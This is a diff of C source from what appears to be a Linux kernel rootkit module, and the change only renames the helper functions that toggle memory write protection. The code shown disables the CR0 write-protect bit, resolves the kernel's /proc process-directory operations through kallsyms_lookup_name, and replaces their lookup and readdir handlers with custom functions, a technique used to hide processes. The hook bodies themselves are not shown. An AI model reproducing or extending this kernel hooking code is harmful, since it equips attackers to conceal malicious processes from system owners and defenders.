@@ -46,12 +46,12 @@ static struct dentry_operations* pid_dentry_operations;
 static const struct inode_operations f_proc_iops;
 
 
-static inline void protect(void)
+static inline void enable_protection(void)
 {
     write_cr0(cr0);
 }
 
-static inline void unprotect(void)
+static inline void disable_protection(void)
 {
     write_cr0(cr0 & ~0x00010000);
 }
@@ -385,16 +385,16 @@ void proc_init(){
   proc_pid_link_inode_operations = *(struct inode_operations *) kallsyms_lookup_name("proc_tgid_base_inode_operations");
 
 
-  unprotect();
+  disable_protection();
   proc_tgid_base_inode_operations->lookup = f_proc_lookup;
   proc_tgid_base_operations->iterate_shared = f_proc_tgid_base_readdir;
-  protect();
+  enable_protection();
 }
 
 void proc_end(){
 
-  unprotect();
+  disable_protection();
   proc_tgid_base_inode_operations->lookup = proc_tgid_base_lookup;
   proc_tgid_base_operations->iterate_shared = proc_tgid_base_readdir;
-  protect();
+  enable_protection();
 }
